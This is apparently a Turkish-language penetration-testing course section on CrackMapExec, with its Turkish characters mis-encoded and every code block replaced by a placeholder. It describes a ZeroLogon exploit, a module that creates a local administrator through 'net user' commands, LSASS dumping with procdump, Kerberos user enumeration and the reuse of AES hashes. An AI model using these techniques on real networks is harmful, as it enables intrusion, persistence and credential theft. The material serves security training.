MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

